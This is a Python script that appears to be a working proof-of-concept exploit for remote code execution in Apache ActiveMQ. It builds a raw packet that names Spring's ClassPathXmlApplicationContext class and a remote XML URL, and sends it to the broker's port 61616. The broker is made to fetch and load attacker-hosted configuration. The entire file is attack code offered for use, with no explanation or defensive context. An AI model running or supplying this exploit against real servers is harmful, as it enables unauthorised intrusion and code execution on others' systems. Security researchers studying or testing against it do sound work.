import socket
import argparse

CLASS_NAME = "org.springframework.context.support.ClassPathXmlApplicationContext"
HEADER = "1f00000000000000000001"

def main(ip, port, url):
    if not ip or not url:
        print("Usage: script.py -i <ip> -p <port> -u <url>")
        return

    banner()

    message = url
    body = f"{HEADER}01{int_to_hex(len(CLASS_NAME), 4)}{string_to_hex(CLASS_NAME)}01{int_to_hex(len(message), 4)}{string_to_hex(message)}"
    payload = f"{int_to_hex(len(body) // 2, 8)}{body}"
    data = bytes.fromhex(payload)

    print(f"[*] Target: {ip}:{port}")
    print(f"[*] XML URL: {url}\n")
    print(f"[*] Sending packet: {payload}")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.connect((ip, int(port)))
            conn.send(data)
    except Exception as e:
        print(f"Failed to send data: {e}")

def banner():
    print("     _        _   _           __  __  ___        ____   ____ _____ \n    / \\   ___| |_(_)_   _____|  \\/  |/ _ \\      |  _ \\ / ___| ____|\n   / _ \\ / __| __| \\ \\ / / _ \\ |\\/| | | | |_____| |_) | |   |  _|  \n  / ___ \\ (__| |_| |\\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ \n /_/   \\_\\___|\\__|_| \\_/ \\___|_|  |_|\\__\\_\\     |_| \\_\\\\____|_____|\n")

def string_to_hex(s):
    """Convert a string to its hexadecimal representation."""
    return s.encode().hex()

def int_to_hex(i, n):
    """Convert an integer to its hexadecimal representation with a fixed length."""
    return format(i, f'0{n}x')

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", help="ActiveMQ Server IP or Host")
    parser.add_argument("-p", "--port", default="61616", help="ActiveMQ Server Port")
    parser.add_argument("-u", "--url", help="Spring XML Url")
    args = parser.parse_args()

    main(args.ip, args.port, args.url)
